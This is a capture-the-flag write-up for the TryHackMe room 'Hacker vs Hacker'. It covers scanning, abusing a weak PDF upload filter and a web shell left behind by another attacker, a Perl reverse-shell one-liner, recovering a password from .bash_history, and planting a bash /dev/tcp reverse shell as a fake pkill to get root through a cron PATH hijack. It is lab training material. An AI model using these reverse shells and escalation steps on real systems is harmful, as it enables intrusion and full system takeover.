@@ -1,0 +1,136 @@
+██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ██╗   ██╗███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
+██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██║   ██║██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+███████║███████║██║     █████╔╝ █████╗  ██████╔╝    ██║   ██║███████╗    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
+██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝╚════██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║     ╚████╔╝ ███████║    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                                                                                                        
+                                       https://tryhackme.com/room/hackervshacker
+
+
+
+[NMAP Scan]
+
+nmap -sV -T4  machine IP
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-26 22:01 UTC
+Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 54.70% done; ETC: 22:01 (0:00:06 remaining)
+Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 22:01 (0:00:06 remaining)
+Nmap scan report for 10.10.194.104
+Host is up (0.31s latency).
+Not shown: 917 closed tcp ports (conn-refused), 81 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+[Source code]
+
+Going to http://[machine IP], I found a few messages in the source code:
+
+<!-- seriously, we need to fire that stupid developer intern -->
+<!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? -->
+
+http://machineIP/cvs/ just gives us a page that says "Directory listing disabled" and nothing else.
+
+The obvious place to try next is the file upload. I tried a generic PHP shell at first, and received this message in response:
+
+Hacked! If you dont want me to upload my shell, do better at filtering!
+
+
+The source code of this page reads:
+
+
+Hacked! If you dont want me to upload my shell, do better at filtering!
+
+<!-- seriously, dumb stuff:
+
+$target_dir = "cvs/";
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+
+if (!strpos($target_file, ".pdf")) {
+  echo "Only PDF CVs are accepted.";
+} else if (file_exists($target_file)) {
+  echo "This CV has already been uploaded!";
+} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+  echo "Success! We will get back to you.";
+} else {
+  echo "Something went wrong :|";
+}
+
+-->
+
+I tried changing the magic byte in my shell, changed the file extensions, changed MIME types and various other things in burpsuite, but still received the same message as above. I think everything leads to the same response.
+
+Eventually I tried /cvs/shell.pdf.php, looking for my shell and got what looks to be the other hacker's shell. All the page says is "boom!"
+
+We can also run commands from this page:
+
+/cvs/shell.pdf.php?cmd=whoami
+www-data
+
+boom!
+
+[User.txt]
+
+I enumerated around the system using ls ../../../ etc., until I found the user "lachlan", and user.txt in their home folder.
+
+[Reverse shell]
+
+I tried various bash one liner reverse shells to no avail. I decided to try the command "which python", which gave no reply, and "which perl" to which it said:
+
+/usr/bin/perl/
+
+And tried a few perl reverse shell one-liners until I found one that worked using the Reverse Shell Generator at https://www.revshells.com/
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"Your tun0 IP:Port #");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Start a listener before executing this: nc -lvnp Port #
+
+[Root.txt]
+
+I browsed around the system looking for any hints or clues and discovered in /home/lachlan/bin :
+
+ls ../../../../home/lachlan/bin
+backup.sh
+cat ../../../../home/lachlan/bin/backup.sh
+# todo: pita website backup as requested by her majesty 
+
+
+As well as this in .bash_history:
+
+cat ../../../../home/lachlan/.bash_history
+./cve.sh
+./cve-patch.sh
+vi /etc/cron.d/persistence
+echo -e "xxxRedactedxxx" | passwd
+ls -sf /dev/null /home/lachlan/.bash_history
+
+We have the user's password (use the last part of the string, minus the "/n" at the beginning.)
+Next let's see what persistence is:
+
+cat ../../../../../../etc/cron.d/persistence
+PATH=/home/lachlan/bin:/bin:/usr/bin
+# * * * * * root backup.sh
+* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+
+The path is /home/lachlan/bin, so perhaps we can run something as root with this. 
+Everything has a path specified except pkill, so it will look for that first in /home/lachlan/bin.
+Let's create a reverse shell with the name pkill, create a listener, and wait for the shell
+
+Trying to ssh into the box will only grant you access for a few seconds, so you will have to be quick.
+This line will create the file for the reverse shell in the appropriate directory (/lachlan/bin/) as well as make it 
+an executable with chmod:
+
+echo "bash -c 'bash -i >& /dev/tcp/your tun0 IP/port# 0>&1'" > bin/pkill ; chmod +x bin/pkill
+
+Start a listener again, and wait a few moments.
+
+Congrats! 
